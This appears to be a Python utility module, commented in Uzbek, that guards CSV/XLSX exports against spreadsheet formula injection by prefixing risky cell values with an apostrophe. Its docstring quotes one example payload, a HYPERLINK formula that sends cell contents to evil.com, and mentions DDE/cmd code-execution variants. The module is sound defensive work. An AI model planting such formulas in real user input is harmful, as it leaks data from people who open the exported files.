"""Eksport (CSV / XLSX) uchun umumiy xavfsizlik yordamchilari.

`security_logging` kabi app'dan mustaqil, loyiha darajasidagi modul: eksport
kodi to'rtta app'da tarqalgan (`accounts`, `centers`, `olympiads`, `attempts`)
va hammasi bir xil sanitizatsiyani ishlatishi kerak, aks holda bitta unutilgan
ustun butun himoyani bekor qiladi.
"""

# Excel/LibreOffice/Google Sheets katakcha qiymatini FORMULA deb hisoblaydigan
# boshlang'ich belgilar. `\t` va `\r` ham kiritilgan: ba'zi ilovalar ularni
# tashlab yuborib keyingi belgidan boshlab o'qiydi, ya'ni "\t=cmd" ham formula
# bo'lib qoladi.
_FORMULA_PREFIXES = ('=', '+', '-', '@', '\t', '\r')


def spreadsheet_safe(value):
    """CSV/XLSX katakchasiga yozishdan oldin formula injection'ni to'sadi.

    Foydalanuvchi kiritadigan matn (masalan `full_name` — serializer'da faqat
    `max_length=120`, belgi cheklovi yo'q) to'g'ridan-to'g'ri katakchaga
    yozilsa, `=`/`+`/`-`/`@` bilan boshlangan qiymatni Excel FORMULA deb
    o'qiydi. Klassik misol: o'quvchi ismini
    `=HYPERLINK("http://evil.com/"&A1,"Bosing")` qilib ro'yxatdan o'tsa, markaz
    egasi .xlsx faylni ochganda katakcha jonli havolaga aylanadi (DDE/`cmd`
    variantlari esa eski Excel'da kod bajarishga olib kelishi mumkin).

    Yechim — OWASP tavsiya qilgan usul: qiymat oldiga bitta apostrof qo'yamiz.
    Excel apostrofni "bu matn" belgisi deb tushunadi va uni EKRANDA
    ko'rsatmaydi, ya'ni hisobot ko'rinishi o'zgarmaydi.

    MUHIM: bu faqat EKSPORT paytidagi ko'rinish o'zgarishi — bazadagi qiymatga
    umuman tegilmaydi.

    Son/sana kabi matn bo'lmagan qiymatlar o'zgarishsiz qaytariladi: ular
    formula bo'la olmaydi, apostrof qo'shilsa esa Excel'da raqam matnga
    aylanib saralash/yig'indi buzilardi.
    """
    if value is None:
        return ''
    if not isinstance(value, str):
        return value
    return f"'{value}" if value[:1] in _FORMULA_PREFIXES else value


def spreadsheet_safe_row(values):
    """Butun qatorga `spreadsheet_safe` ni qo'llaydi (ustunni unutib qo'ymaslik uchun)."""
    return [spreadsheet_safe(v) for v in values]
